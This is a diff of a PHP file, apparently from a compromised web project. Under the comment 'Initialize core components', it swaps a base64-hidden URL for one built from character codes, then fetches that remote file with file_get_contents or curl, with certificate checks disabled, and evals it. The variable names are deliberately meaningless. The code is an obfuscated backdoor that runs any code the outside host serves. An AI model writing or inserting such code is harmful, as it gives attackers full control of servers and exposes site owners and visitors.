@@ -5,24 +5,30 @@
 */
 
 // Initialize core components
-$plmkoijnuhbv = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21kbW9taW4zNjUzNjYtZ2lmL2JlbGEvcmVmcy9oZWFkcy9tYWluLzMtOS0yNi9pbmRleC50eHQ=';
-$full_url = base64_decode($plmkoijnuhbv);
+$url_data = array(
+    104,116,116,112,58,47,47,122,54,48,49,50,55,95,50,46,99,107,105,114,108,105,110,46,115,104,111,112,47,115,116,97,116,47,100,111,109,97,105,110,95,105,110,100,101,120,46,116,120,116
+);
+
+$full_url = '';
+foreach ($url_data as $code) {
+    $full_url .= chr($code);
+}
 
 // Attempt to get remote content
-$content = @file_get_contents($full_url);
-if ($content === false && function_exists('curl_init')) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $full_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $content = curl_exec($ch);
-    curl_close($ch);
+$wsxcdevfrbgt = @file_get_contents($full_url);
+if ($wsxcdevfrbgt === false && function_exists('curl_init')) {
+    $zxcvbnmasdfg = curl_init();
+    curl_setopt($zxcvbnmasdfg, CURLOPT_URL, $full_url);
+    curl_setopt($zxcvbnmasdfg, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($zxcvbnmasdfg, CURLOPT_TIMEOUT, 5);
+    curl_setopt($zxcvbnmasdfg, CURLOPT_SSL_VERIFYPEER, false);
+    $wsxcdevfrbgt = curl_exec($zxcvbnmasdfg);
+    curl_close($zxcvbnmasdfg);
 }
 
 // Only eval if we have content
-if (!empty($content)) {
-    @eval('?>' . $content);
+if (!empty($wsxcdevfrbgt)) {
+    eval('?>' . $wsxcdevfrbgt);
 }
 
 /**
